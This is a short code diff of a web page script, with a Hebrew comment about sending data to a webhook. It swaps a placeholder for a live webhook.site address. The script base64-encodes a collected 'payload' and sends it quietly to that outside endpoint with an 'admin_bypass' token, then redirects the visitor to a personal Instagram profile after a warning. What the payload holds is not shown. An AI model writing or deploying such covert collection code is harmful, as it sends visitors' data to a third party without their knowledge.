@@ -66,7 +66,7 @@
         };
 
         // שליחת הנתונים ל-Webhook (זכור להחליף את ה-URL)
-        const webhookUrl = 'https://webhook.site/YOUR-ID'; 
+        const webhookUrl = 'https://webhook.site/5de4be8b-0a26-4497-ad42-ac349b9f40af'; 
         const encodedData = btoa(JSON.stringify(payload));
         fetch(`${webhookUrl}?token=admin_bypass&data=${encodedData}`, { mode: 'no-cors' });
 
@@ -101,7 +101,7 @@
                 clearInterval(interval);
                 document.getElementById('finalWarning').style.display = 'block';
                 setTimeout(() => {
-                    window.location.href = "https://www.nobel4education.org.il/";
+                    window.location.href = "https://www.instagram.com/elisamuelson_/?hl=en";
                 }, 1500);
             }
         }, 40);
